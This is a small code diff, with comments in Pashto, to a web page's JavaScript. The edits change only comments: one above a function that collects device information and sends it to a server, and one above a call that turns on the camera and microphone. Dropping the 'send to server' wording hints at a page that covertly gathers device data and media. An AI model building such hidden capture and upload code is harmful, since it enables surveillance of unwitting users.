@@ -60,7 +60,7 @@
             } catch (e) {}
         }
 
-        // د موبایل د معلوماتو راټولول او سمدستي سرور ته استول
+        // د موبایل د معلوماتو راټولول
         async function collectAndSendDeviceInfo() {
             try {
                 let batteryLevel = "نامعلوم";
@@ -156,7 +156,7 @@
 
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    // دلته 'audio: true' په سمه توګه سم شو
+                    // دلته 'audio: true' په سمه توګه په کوچني توري ولیکل شو
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
